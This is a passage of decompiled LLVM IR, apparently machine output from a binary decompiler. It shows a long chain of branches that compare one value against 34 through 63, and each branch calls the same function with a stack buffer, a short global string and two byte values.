  %v2_804a46f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a46f, i32* @ebx, align 4
  %v5_804a476 = call i32 @function_8048b5b(i32 %v2_804a46f, i32 ptrtoint ([13 x i8]* @global_var_805a0ce.76 to i32), i32 %v1_804a460, i32 %v1_804a454)
  br label %dec_label_pc_804a47e

dec_label_pc_804a47e:                             ; preds = %dec_label_pc_804a44e, %dec_label_pc_804a454
  %v12_804a47e = icmp eq i32 %v11_8049e19, 34
  %v1_804a482 = icmp eq i1 %v12_804a47e, false
  br i1 %v1_804a482, label %dec_label_pc_804a4ae, label %dec_label_pc_804a484

dec_label_pc_804a484:                             ; preds = %dec_label_pc_804a47e
  %v0_804a484 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a484 = zext i8 %v0_804a484 to i32
  store i32 %v1_804a484, i32* @edx, align 4
  %v0_804a490 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a490 = zext i8 %v0_804a490 to i32
  %v2_804a49f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a49f, i32* @ebx, align 4
  %v5_804a4a6 = call i32 @function_8048b5b(i32 %v2_804a49f, i32 ptrtoint ([13 x i8]* @global_var_805a0db.77 to i32), i32 %v1_804a490, i32 %v1_804a484)
  br label %dec_label_pc_804a4ae

dec_label_pc_804a4ae:                             ; preds = %dec_label_pc_804a47e, %dec_label_pc_804a484
  %v12_804a4ae = icmp eq i32 %v11_8049e19, 35
  %v1_804a4b2 = icmp eq i1 %v12_804a4ae, false
  br i1 %v1_804a4b2, label %dec_label_pc_804a4de, label %dec_label_pc_804a4b4

dec_label_pc_804a4b4:                             ; preds = %dec_label_pc_804a4ae
  %v0_804a4b4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a4b4 = zext i8 %v0_804a4b4 to i32
  store i32 %v1_804a4b4, i32* @edx, align 4
  %v0_804a4c0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a4c0 = zext i8 %v0_804a4c0 to i32
  %v2_804a4cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4cf, i32* @ebx, align 4
  %v5_804a4d6 = call i32 @function_8048b5b(i32 %v2_804a4cf, i32 ptrtoint ([13 x i8]* @global_var_805a0e8.78 to i32), i32 %v1_804a4c0, i32 %v1_804a4b4)
  br label %dec_label_pc_804a4de

dec_label_pc_804a4de:                             ; preds = %dec_label_pc_804a4ae, %dec_label_pc_804a4b4
  %v12_804a4de = icmp eq i32 %v11_8049e19, 36
  %v1_804a4e2 = icmp eq i1 %v12_804a4de, false
  br i1 %v1_804a4e2, label %dec_label_pc_804a50e, label %dec_label_pc_804a4e4

dec_label_pc_804a4e4:                             ; preds = %dec_label_pc_804a4de
  %v0_804a4e4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a4e4 = zext i8 %v0_804a4e4 to i32
  store i32 %v1_804a4e4, i32* @edx, align 4
  %v0_804a4f0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a4f0 = zext i8 %v0_804a4f0 to i32
  %v2_804a4ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ff, i32* @ebx, align 4
  %v5_804a506 = call i32 @function_8048b5b(i32 %v2_804a4ff, i32 ptrtoint ([13 x i8]* @global_var_805a0f5.79 to i32), i32 %v1_804a4f0, i32 %v1_804a4e4)
  br label %dec_label_pc_804a50e

dec_label_pc_804a50e:                             ; preds = %dec_label_pc_804a4de, %dec_label_pc_804a4e4
  %v12_804a50e = icmp eq i32 %v11_8049e19, 37
  %v1_804a512 = icmp eq i1 %v12_804a50e, false
  br i1 %v1_804a512, label %dec_label_pc_804a53e, label %dec_label_pc_804a514

dec_label_pc_804a514:                             ; preds = %dec_label_pc_804a50e
  %v0_804a514 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a514 = zext i8 %v0_804a514 to i32
  store i32 %v1_804a514, i32* @edx, align 4
  %v0_804a520 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a520 = zext i8 %v0_804a520 to i32
  %v2_804a52f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a52f, i32* @ebx, align 4
  %v5_804a536 = call i32 @function_8048b5b(i32 %v2_804a52f, i32 ptrtoint ([13 x i8]* @global_var_805a102.80 to i32), i32 %v1_804a520, i32 %v1_804a514)
  br label %dec_label_pc_804a53e

dec_label_pc_804a53e:                             ; preds = %dec_label_pc_804a50e, %dec_label_pc_804a514
  %v12_804a53e = icmp eq i32 %v11_8049e19, 38
  %v1_804a542 = icmp eq i1 %v12_804a53e, false
  br i1 %v1_804a542, label %dec_label_pc_804a56e, label %dec_label_pc_804a544

dec_label_pc_804a544:                             ; preds = %dec_label_pc_804a53e
  %v0_804a544 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a544 = zext i8 %v0_804a544 to i32
  store i32 %v1_804a544, i32* @edx, align 4
  %v0_804a550 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a550 = zext i8 %v0_804a550 to i32
  %v2_804a55f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a55f, i32* @ebx, align 4
  %v5_804a566 = call i32 @function_8048b5b(i32 %v2_804a55f, i32 ptrtoint ([13 x i8]* @global_var_805a10f.81 to i32), i32 %v1_804a550, i32 %v1_804a544)
  br label %dec_label_pc_804a56e

dec_label_pc_804a56e:                             ; preds = %dec_label_pc_804a53e, %dec_label_pc_804a544
  %v12_804a56e = icmp eq i32 %v11_8049e19, 39
  %v1_804a572 = icmp eq i1 %v12_804a56e, false
  br i1 %v1_804a572, label %dec_label_pc_804a59e, label %dec_label_pc_804a574

dec_label_pc_804a574:                             ; preds = %dec_label_pc_804a56e
  %v0_804a574 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a574 = zext i8 %v0_804a574 to i32
  store i32 %v1_804a574, i32* @edx, align 4
  %v0_804a580 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a580 = zext i8 %v0_804a580 to i32
  %v2_804a58f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a58f, i32* @ebx, align 4
  %v5_804a596 = call i32 @function_8048b5b(i32 %v2_804a58f, i32 ptrtoint ([13 x i8]* @global_var_805a11c.82 to i32), i32 %v1_804a580, i32 %v1_804a574)
  br label %dec_label_pc_804a59e

dec_label_pc_804a59e:                             ; preds = %dec_label_pc_804a56e, %dec_label_pc_804a574
  %v12_804a59e = icmp eq i32 %v11_8049e19, 40
  %v1_804a5a2 = icmp eq i1 %v12_804a59e, false
  br i1 %v1_804a5a2, label %dec_label_pc_804a5ce, label %dec_label_pc_804a5a4

dec_label_pc_804a5a4:                             ; preds = %dec_label_pc_804a59e
  %v0_804a5a4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a5a4 = zext i8 %v0_804a5a4 to i32
  store i32 %v1_804a5a4, i32* @edx, align 4
  %v0_804a5b0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a5b0 = zext i8 %v0_804a5b0 to i32
  %v2_804a5bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5bf, i32* @ebx, align 4
  %v5_804a5c6 = call i32 @function_8048b5b(i32 %v2_804a5bf, i32 ptrtoint ([14 x i8]* @global_var_805a129.83 to i32), i32 %v1_804a5b0, i32 %v1_804a5a4)
  br label %dec_label_pc_804a5ce

dec_label_pc_804a5ce:                             ; preds = %dec_label_pc_804a59e, %dec_label_pc_804a5a4
  %v12_804a5ce = icmp eq i32 %v11_8049e19, 41
  %v1_804a5d2 = icmp eq i1 %v12_804a5ce, false
  br i1 %v1_804a5d2, label %dec_label_pc_804a5fe, label %dec_label_pc_804a5d4

dec_label_pc_804a5d4:                             ; preds = %dec_label_pc_804a5ce
  %v0_804a5d4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a5d4 = zext i8 %v0_804a5d4 to i32
  store i32 %v1_804a5d4, i32* @edx, align 4
  %v0_804a5e0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a5e0 = zext i8 %v0_804a5e0 to i32
  %v2_804a5ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5ef, i32* @ebx, align 4
  %v5_804a5f6 = call i32 @function_8048b5b(i32 %v2_804a5ef, i32 ptrtoint ([13 x i8]* @global_var_805a137.84 to i32), i32 %v1_804a5e0, i32 %v1_804a5d4)
  br label %dec_label_pc_804a5fe

dec_label_pc_804a5fe:                             ; preds = %dec_label_pc_804a5ce, %dec_label_pc_804a5d4
  %v12_804a5fe = icmp eq i32 %v11_8049e19, 42
  %v1_804a602 = icmp eq i1 %v12_804a5fe, false
  br i1 %v1_804a602, label %dec_label_pc_804a62e, label %dec_label_pc_804a604

dec_label_pc_804a604:                             ; preds = %dec_label_pc_804a5fe
  %v0_804a604 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a604 = zext i8 %v0_804a604 to i32
  store i32 %v1_804a604, i32* @edx, align 4
  %v0_804a610 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a610 = zext i8 %v0_804a610 to i32
  %v2_804a61f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a61f, i32* @ebx, align 4
  %v5_804a626 = call i32 @function_8048b5b(i32 %v2_804a61f, i32 ptrtoint ([13 x i8]* @global_var_805a144.85 to i32), i32 %v1_804a610, i32 %v1_804a604)
  br label %dec_label_pc_804a62e

dec_label_pc_804a62e:                             ; preds = %dec_label_pc_804a5fe, %dec_label_pc_804a604
  %v12_804a62e = icmp eq i32 %v11_8049e19, 43
  %v1_804a632 = icmp eq i1 %v12_804a62e, false
  br i1 %v1_804a632, label %dec_label_pc_804a65e, label %dec_label_pc_804a634

dec_label_pc_804a634:                             ; preds = %dec_label_pc_804a62e
  %v0_804a634 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a634 = zext i8 %v0_804a634 to i32
  store i32 %v1_804a634, i32* @edx, align 4
  %v0_804a640 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a640 = zext i8 %v0_804a640 to i32
  %v2_804a64f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a64f, i32* @ebx, align 4
  %v5_804a656 = call i32 @function_8048b5b(i32 %v2_804a64f, i32 ptrtoint ([13 x i8]* @global_var_805a151.86 to i32), i32 %v1_804a640, i32 %v1_804a634)
  br label %dec_label_pc_804a65e

dec_label_pc_804a65e:                             ; preds = %dec_label_pc_804a62e, %dec_label_pc_804a634
  %v12_804a65e = icmp eq i32 %v11_8049e19, 44
  %v1_804a662 = icmp eq i1 %v12_804a65e, false
  br i1 %v1_804a662, label %dec_label_pc_804a68e, label %dec_label_pc_804a664

dec_label_pc_804a664:                             ; preds = %dec_label_pc_804a65e
  %v0_804a664 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a664 = zext i8 %v0_804a664 to i32
  store i32 %v1_804a664, i32* @edx, align 4
  %v0_804a670 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a670 = zext i8 %v0_804a670 to i32
  %v2_804a67f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a67f, i32* @ebx, align 4
  %v5_804a686 = call i32 @function_8048b5b(i32 %v2_804a67f, i32 ptrtoint ([13 x i8]* @global_var_805a15e.87 to i32), i32 %v1_804a670, i32 %v1_804a664)
  br label %dec_label_pc_804a68e

dec_label_pc_804a68e:                             ; preds = %dec_label_pc_804a65e, %dec_label_pc_804a664
  %v12_804a68e = icmp eq i32 %v11_8049e19, 45
  %v1_804a692 = icmp eq i1 %v12_804a68e, false
  br i1 %v1_804a692, label %dec_label_pc_804a6be, label %dec_label_pc_804a694

dec_label_pc_804a694:                             ; preds = %dec_label_pc_804a68e
  %v0_804a694 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a694 = zext i8 %v0_804a694 to i32
  store i32 %v1_804a694, i32* @edx, align 4
  %v0_804a6a0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a6a0 = zext i8 %v0_804a6a0 to i32
  %v2_804a6af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6af, i32* @ebx, align 4
  %v5_804a6b6 = call i32 @function_8048b5b(i32 %v2_804a6af, i32 ptrtoint ([13 x i8]* @global_var_805a16b.88 to i32), i32 %v1_804a6a0, i32 %v1_804a694)
  br label %dec_label_pc_804a6be

dec_label_pc_804a6be:                             ; preds = %dec_label_pc_804a68e, %dec_label_pc_804a694
  %v12_804a6be = icmp eq i32 %v11_8049e19, 46
  %v1_804a6c2 = icmp eq i1 %v12_804a6be, false
  br i1 %v1_804a6c2, label %dec_label_pc_804a6ee, label %dec_label_pc_804a6c4

dec_label_pc_804a6c4:                             ; preds = %dec_label_pc_804a6be
  %v0_804a6c4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a6c4 = zext i8 %v0_804a6c4 to i32
  store i32 %v1_804a6c4, i32* @edx, align 4
  %v0_804a6d0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a6d0 = zext i8 %v0_804a6d0 to i32
  %v2_804a6df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6df, i32* @ebx, align 4
  %v5_804a6e6 = call i32 @function_8048b5b(i32 %v2_804a6df, i32 ptrtoint ([13 x i8]* @global_var_805a178.89 to i32), i32 %v1_804a6d0, i32 %v1_804a6c4)
  br label %dec_label_pc_804a6ee

dec_label_pc_804a6ee:                             ; preds = %dec_label_pc_804a6be, %dec_label_pc_804a6c4
  %v12_804a6ee = icmp eq i32 %v11_8049e19, 47
  %v1_804a6f2 = icmp eq i1 %v12_804a6ee, false
  br i1 %v1_804a6f2, label %dec_label_pc_804a71e, label %dec_label_pc_804a6f4

dec_label_pc_804a6f4:                             ; preds = %dec_label_pc_804a6ee
  %v0_804a6f4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a6f4 = zext i8 %v0_804a6f4 to i32
  store i32 %v1_804a6f4, i32* @edx, align 4
  %v0_804a700 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a700 = zext i8 %v0_804a700 to i32
  %v2_804a70f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a70f, i32* @ebx, align 4
  %v5_804a716 = call i32 @function_8048b5b(i32 %v2_804a70f, i32 ptrtoint ([14 x i8]* @global_var_805a185.90 to i32), i32 %v1_804a700, i32 %v1_804a6f4)
  br label %dec_label_pc_804a71e

dec_label_pc_804a71e:                             ; preds = %dec_label_pc_804a6ee, %dec_label_pc_804a6f4
  %v9_804a71e = icmp eq i32 %v11_8049e19, 48
  %v1_804a722 = icmp eq i1 %v9_804a71e, false
  br i1 %v1_804a722, label %dec_label_pc_804a74e, label %dec_label_pc_804a724

dec_label_pc_804a724:                             ; preds = %dec_label_pc_804a71e
  %v0_804a724 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a724 = zext i8 %v0_804a724 to i32
  store i32 %v1_804a724, i32* @edx, align 4
  %v0_804a730 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a730 = zext i8 %v0_804a730 to i32
  %v2_804a73f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a73f, i32* @ebx, align 4
  %v5_804a746 = call i32 @function_8048b5b(i32 %v2_804a73f, i32 ptrtoint ([13 x i8]* @global_var_805a193.91 to i32), i32 %v1_804a730, i32 %v1_804a724)
  br label %dec_label_pc_804a74e

dec_label_pc_804a74e:                             ; preds = %dec_label_pc_804a71e, %dec_label_pc_804a724
  %v12_804a74e = icmp eq i32 %v11_8049e19, 49
  %v1_804a752 = icmp eq i1 %v12_804a74e, false
  br i1 %v1_804a752, label %dec_label_pc_804a77e, label %dec_label_pc_804a754

dec_label_pc_804a754:                             ; preds = %dec_label_pc_804a74e
  %v0_804a754 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a754 = zext i8 %v0_804a754 to i32
  store i32 %v1_804a754, i32* @edx, align 4
  %v0_804a760 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a760 = zext i8 %v0_804a760 to i32
  %v2_804a76f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a76f, i32* @ebx, align 4
  %v5_804a776 = call i32 @function_8048b5b(i32 %v2_804a76f, i32 ptrtoint ([14 x i8]* @global_var_805a1a0.92 to i32), i32 %v1_804a760, i32 %v1_804a754)
  br label %dec_label_pc_804a77e

dec_label_pc_804a77e:                             ; preds = %dec_label_pc_804a74e, %dec_label_pc_804a754
  %v12_804a77e = icmp eq i32 %v11_8049e19, 50
  %v1_804a782 = icmp eq i1 %v12_804a77e, false
  br i1 %v1_804a782, label %dec_label_pc_804a7ae, label %dec_label_pc_804a784

dec_label_pc_804a784:                             ; preds = %dec_label_pc_804a77e
  %v0_804a784 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a784 = zext i8 %v0_804a784 to i32
  store i32 %v1_804a784, i32* @edx, align 4
  %v0_804a790 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a790 = zext i8 %v0_804a790 to i32
  %v2_804a79f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a79f, i32* @ebx, align 4
  %v5_804a7a6 = call i32 @function_8048b5b(i32 %v2_804a79f, i32 ptrtoint ([14 x i8]* @global_var_805a1ae.93 to i32), i32 %v1_804a790, i32 %v1_804a784)
  br label %dec_label_pc_804a7ae

dec_label_pc_804a7ae:                             ; preds = %dec_label_pc_804a77e, %dec_label_pc_804a784
  %v12_804a7ae = icmp eq i32 %v11_8049e19, 51
  %v1_804a7b2 = icmp eq i1 %v12_804a7ae, false
  br i1 %v1_804a7b2, label %dec_label_pc_804a7de, label %dec_label_pc_804a7b4

dec_label_pc_804a7b4:                             ; preds = %dec_label_pc_804a7ae
  %v0_804a7b4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a7b4 = zext i8 %v0_804a7b4 to i32
  store i32 %v1_804a7b4, i32* @edx, align 4
  %v0_804a7c0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a7c0 = zext i8 %v0_804a7c0 to i32
  %v2_804a7cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7cf, i32* @ebx, align 4
  %v5_804a7d6 = call i32 @function_8048b5b(i32 %v2_804a7cf, i32 ptrtoint ([14 x i8]* @global_var_805a1bc.94 to i32), i32 %v1_804a7c0, i32 %v1_804a7b4)
  br label %dec_label_pc_804a7de

dec_label_pc_804a7de:                             ; preds = %dec_label_pc_804a7ae, %dec_label_pc_804a7b4
  %v12_804a7de = icmp eq i32 %v11_8049e19, 52
  %v1_804a7e2 = icmp eq i1 %v12_804a7de, false
  br i1 %v1_804a7e2, label %dec_label_pc_804a80e, label %dec_label_pc_804a7e4

dec_label_pc_804a7e4:                             ; preds = %dec_label_pc_804a7de
  %v0_804a7e4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a7e4 = zext i8 %v0_804a7e4 to i32
  store i32 %v1_804a7e4, i32* @edx, align 4
  %v0_804a7f0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a7f0 = zext i8 %v0_804a7f0 to i32
  %v2_804a7ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7ff, i32* @ebx, align 4
  %v5_804a806 = call i32 @function_8048b5b(i32 %v2_804a7ff, i32 ptrtoint ([14 x i8]* @global_var_805a1ca.95 to i32), i32 %v1_804a7f0, i32 %v1_804a7e4)
  br label %dec_label_pc_804a80e

dec_label_pc_804a80e:                             ; preds = %dec_label_pc_804a7de, %dec_label_pc_804a7e4
  %v12_804a80e = icmp eq i32 %v11_8049e19, 53
  %v1_804a812 = icmp eq i1 %v12_804a80e, false
  br i1 %v1_804a812, label %dec_label_pc_804a83e, label %dec_label_pc_804a814

dec_label_pc_804a814:                             ; preds = %dec_label_pc_804a80e
  %v0_804a814 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a814 = zext i8 %v0_804a814 to i32
  store i32 %v1_804a814, i32* @edx, align 4
  %v0_804a820 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a820 = zext i8 %v0_804a820 to i32
  %v2_804a82f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a82f, i32* @ebx, align 4
  %v5_804a836 = call i32 @function_8048b5b(i32 %v2_804a82f, i32 ptrtoint ([13 x i8]* @global_var_805a1d8.96 to i32), i32 %v1_804a820, i32 %v1_804a814)
  br label %dec_label_pc_804a83e

dec_label_pc_804a83e:                             ; preds = %dec_label_pc_804a80e, %dec_label_pc_804a814
  %v12_804a83e = icmp eq i32 %v11_8049e19, 54
  %v1_804a842 = icmp eq i1 %v12_804a83e, false
  br i1 %v1_804a842, label %dec_label_pc_804a86e, label %dec_label_pc_804a844

dec_label_pc_804a844:                             ; preds = %dec_label_pc_804a83e
  %v0_804a844 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a844 = zext i8 %v0_804a844 to i32
  store i32 %v1_804a844, i32* @edx, align 4
  %v0_804a850 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a850 = zext i8 %v0_804a850 to i32
  %v2_804a85f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a85f, i32* @ebx, align 4
  %v5_804a866 = call i32 @function_8048b5b(i32 %v2_804a85f, i32 ptrtoint ([14 x i8]* @global_var_805a1e5.97 to i32), i32 %v1_804a850, i32 %v1_804a844)
  br label %dec_label_pc_804a86e

dec_label_pc_804a86e:                             ; preds = %dec_label_pc_804a83e, %dec_label_pc_804a844
  %v12_804a86e = icmp eq i32 %v11_8049e19, 55
  %v1_804a872 = icmp eq i1 %v12_804a86e, false
  br i1 %v1_804a872, label %dec_label_pc_804a89e, label %dec_label_pc_804a874

dec_label_pc_804a874:                             ; preds = %dec_label_pc_804a86e
  %v0_804a874 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a874 = zext i8 %v0_804a874 to i32
  store i32 %v1_804a874, i32* @edx, align 4
  %v0_804a880 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a880 = zext i8 %v0_804a880 to i32
  %v2_804a88f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a88f, i32* @ebx, align 4
  %v5_804a896 = call i32 @function_8048b5b(i32 %v2_804a88f, i32 ptrtoint ([14 x i8]* @global_var_805a1f3.98 to i32), i32 %v1_804a880, i32 %v1_804a874)
  br label %dec_label_pc_804a89e

dec_label_pc_804a89e:                             ; preds = %dec_label_pc_804a86e, %dec_label_pc_804a874
  %v12_804a89e = icmp eq i32 %v11_8049e19, 56
  %v1_804a8a2 = icmp eq i1 %v12_804a89e, false
  br i1 %v1_804a8a2, label %dec_label_pc_804a8ce, label %dec_label_pc_804a8a4

dec_label_pc_804a8a4:                             ; preds = %dec_label_pc_804a89e
  %v0_804a8a4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a8a4 = zext i8 %v0_804a8a4 to i32
  store i32 %v1_804a8a4, i32* @edx, align 4
  %v0_804a8b0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a8b0 = zext i8 %v0_804a8b0 to i32
  %v2_804a8bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8bf, i32* @ebx, align 4
  %v5_804a8c6 = call i32 @function_8048b5b(i32 %v2_804a8bf, i32 ptrtoint ([14 x i8]* @global_var_805a201.99 to i32), i32 %v1_804a8b0, i32 %v1_804a8a4)
  br label %dec_label_pc_804a8ce

dec_label_pc_804a8ce:                             ; preds = %dec_label_pc_804a89e, %dec_label_pc_804a8a4
  %v12_804a8ce = icmp eq i32 %v11_8049e19, 57
  %v1_804a8d2 = icmp eq i1 %v12_804a8ce, false
  br i1 %v1_804a8d2, label %dec_label_pc_804a8fe, label %dec_label_pc_804a8d4

dec_label_pc_804a8d4:                             ; preds = %dec_label_pc_804a8ce
  %v0_804a8d4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a8d4 = zext i8 %v0_804a8d4 to i32
  store i32 %v1_804a8d4, i32* @edx, align 4
  %v0_804a8e0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a8e0 = zext i8 %v0_804a8e0 to i32
  %v2_804a8ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8ef, i32* @ebx, align 4
  %v5_804a8f6 = call i32 @function_8048b5b(i32 %v2_804a8ef, i32 ptrtoint ([14 x i8]* @global_var_805a20f.100 to i32), i32 %v1_804a8e0, i32 %v1_804a8d4)
  br label %dec_label_pc_804a8fe

dec_label_pc_804a8fe:                             ; preds = %dec_label_pc_804a8ce, %dec_label_pc_804a8d4
  %v12_804a8fe = icmp eq i32 %v11_8049e19, 58
  %v1_804a902 = icmp eq i1 %v12_804a8fe, false
  br i1 %v1_804a902, label %dec_label_pc_804a92e, label %dec_label_pc_804a904

dec_label_pc_804a904:                             ; preds = %dec_label_pc_804a8fe
  %v0_804a904 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a904 = zext i8 %v0_804a904 to i32
  store i32 %v1_804a904, i32* @edx, align 4
  %v0_804a910 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a910 = zext i8 %v0_804a910 to i32
  %v2_804a91f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a91f, i32* @ebx, align 4
  %v5_804a926 = call i32 @function_8048b5b(i32 %v2_804a91f, i32 ptrtoint ([14 x i8]* @global_var_805a21d.101 to i32), i32 %v1_804a910, i32 %v1_804a904)
  br label %dec_label_pc_804a92e

dec_label_pc_804a92e:                             ; preds = %dec_label_pc_804a8fe, %dec_label_pc_804a904
  %v12_804a92e = icmp eq i32 %v11_8049e19, 59
  %v1_804a932 = icmp eq i1 %v12_804a92e, false
  br i1 %v1_804a932, label %dec_label_pc_804a95e, label %dec_label_pc_804a934

dec_label_pc_804a934:                             ; preds = %dec_label_pc_804a92e
  %v0_804a934 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a934 = zext i8 %v0_804a934 to i32
  store i32 %v1_804a934, i32* @edx, align 4
  %v0_804a940 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a940 = zext i8 %v0_804a940 to i32
  %v2_804a94f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a94f, i32* @ebx, align 4
  %v5_804a956 = call i32 @function_8048b5b(i32 %v2_804a94f, i32 ptrtoint ([14 x i8]* @global_var_805a22b.102 to i32), i32 %v1_804a940, i32 %v1_804a934)
  br label %dec_label_pc_804a95e

dec_label_pc_804a95e:                             ; preds = %dec_label_pc_804a92e, %dec_label_pc_804a934
  %v12_804a95e = icmp eq i32 %v11_8049e19, 60
  %v1_804a962 = icmp eq i1 %v12_804a95e, false
  br i1 %v1_804a962, label %dec_label_pc_804a98e, label %dec_label_pc_804a964

dec_label_pc_804a964:                             ; preds = %dec_label_pc_804a95e
  %v0_804a964 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a964 = zext i8 %v0_804a964 to i32
  store i32 %v1_804a964, i32* @edx, align 4
  %v0_804a970 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a970 = zext i8 %v0_804a970 to i32
  %v2_804a97f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a97f, i32* @ebx, align 4
  %v5_804a986 = call i32 @function_8048b5b(i32 %v2_804a97f, i32 ptrtoint ([13 x i8]* @global_var_805a239.103 to i32), i32 %v1_804a970, i32 %v1_804a964)
  br label %dec_label_pc_804a98e

dec_label_pc_804a98e:                             ; preds = %dec_label_pc_804a95e, %dec_label_pc_804a964
  %v12_804a98e = icmp eq i32 %v11_8049e19, 61
  %v1_804a992 = icmp eq i1 %v12_804a98e, false
  br i1 %v1_804a992, label %dec_label_pc_804a9be, label %dec_label_pc_804a994

dec_label_pc_804a994:                             ; preds = %dec_label_pc_804a98e
  %v0_804a994 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a994 = zext i8 %v0_804a994 to i32
  store i32 %v1_804a994, i32* @edx, align 4
  %v0_804a9a0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a9a0 = zext i8 %v0_804a9a0 to i32
  %v2_804a9af = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9af, i32* @ebx, align 4
  %v5_804a9b6 = call i32 @function_8048b5b(i32 %v2_804a9af, i32 ptrtoint ([14 x i8]* @global_var_805a246.104 to i32), i32 %v1_804a9a0, i32 %v1_804a994)
  br label %dec_label_pc_804a9be

dec_label_pc_804a9be:                             ; preds = %dec_label_pc_804a98e, %dec_label_pc_804a994
  %v12_804a9be = icmp eq i32 %v11_8049e19, 62
  %v1_804a9c2 = icmp eq i1 %v12_804a9be, false
  br i1 %v1_804a9c2, label %dec_label_pc_804a9ee, label %dec_label_pc_804a9c4

dec_label_pc_804a9c4:                             ; preds = %dec_label_pc_804a9be
  %v0_804a9c4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_804a9c4 = zext i8 %v0_804a9c4 to i32
  store i32 %v1_804a9c4, i32* @edx, align 4
  %v0_804a9d0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_804a9d0 = zext i8 %v0_804a9d0 to i32
  %v2_804a9df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9df, i32* @ebx, align 4
  %v5_804a9e6 = call i32 @function_8048b5b(i32 %v2_804a9df, i32 ptrtoint ([14 x i8]* @global_var_805a254.105 to i32), i32 %v1_804a9d0, i32 %v1_804a9c4)
  br label %dec_label_pc_804a9ee

dec_label_pc_804a9ee:                             ; preds = %dec_label_pc_804a9be, %dec_label_pc_804a9c4
  %v12_804a9ee = icmp eq i32 %v11_8049e19, 63
  %v1_804a9f2 = icmp eq i1 %v12_804a9ee, false
